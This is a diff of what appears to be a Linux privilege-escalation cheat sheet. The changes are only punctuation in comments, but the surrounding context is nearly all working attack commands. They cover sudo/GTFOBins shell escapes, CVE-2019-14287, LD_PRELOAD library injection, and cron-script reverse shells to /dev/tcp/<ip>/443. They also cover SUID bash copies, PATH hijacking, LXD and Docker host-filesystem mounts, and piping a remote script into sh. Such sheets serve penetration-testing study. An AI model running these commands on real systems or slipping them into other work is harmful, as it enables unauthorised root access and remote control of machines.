@@ -26,7 +26,7 @@ cat /proc/version
 
 ## sudo -l Abuse
 
-### GTFOBins — always check https://gtfobins.github.io/
+### GTFOBins: always check https://gtfobins.github.io/
 
 ```bash
 # NOPASSWD: /usr/bin/nano → get shell
@@ -45,11 +45,11 @@ sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.hook -Z root
 sudo /usr/bin/journalctl -n5 -usome.service
 # At the pager: !/bin/bash
 
-# CVE-2019-14287 (sudo < 1.8.28) — bypass user restriction
+# CVE-2019-14287 (sudo < 1.8.28): bypass user restriction
 # (ALL, !root) NOPASSWD: /bin/bash
 sudo -u#-1 /bin/bash
 
-# LD_PRELOAD preserved — load malicious .so
+# LD_PRELOAD preserved: load malicious .so
 # sudo entry: (root) NOPASSWD: SETENV: /usr/bin/python3
 cat > /tmp/root.c << 'EOF'
 #include <stdio.h>
@@ -119,11 +119,11 @@ crontab -l
 # If cron runs a script you can write to:
 echo 'bash -i >& /dev/tcp/<ip>/443 0>&1' >> /path/to/script.sh
 
-# If cron runs a script in a writable directory — replace it
+# If cron runs a script in a writable directory: replace it
 cp /bin/bash /tmp/bash && chmod +s /tmp/bash   # as payload
 # then: /tmp/bash -p
 
-# PATH hijack — if cron script calls a binary without full path
+# PATH hijack: if cron script calls a binary without full path
 # and PATH is writable before /usr/bin
 echo '#!/bin/bash\nbash -i >& /dev/tcp/<ip>/443 0>&1' > /tmp/service
 chmod +x /tmp/service
@@ -176,7 +176,7 @@ gcc -fPIC -shared -o /tmp/libhijack.so /tmp/lib.c
 # Check group membership
 id | grep -E 'lxd|docker'
 
-# LXD — mount host root into container
+# LXD: mount host root into container
 lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
 lxc init alpine r00t -c security.privileged=true
 lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
@@ -184,7 +184,7 @@ lxc start r00t
 lxc exec r00t /bin/sh
 # Now: cd /mnt/root → full host filesystem as root
 
-# Docker — mount host root into container
+# Docker: mount host root into container
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 # Docker socket writable
@@ -218,7 +218,7 @@ chmod +s /tmp/nfsmount/rootbash
 ## Automated Enumeration
 
 ```bash
-# LinPEAS — most comprehensive
+# LinPEAS: most comprehensive
 curl -sL https://linpeas.sh | sh
 ./linpeas.sh 2>/dev/null | tee /tmp/linpeas.out
 
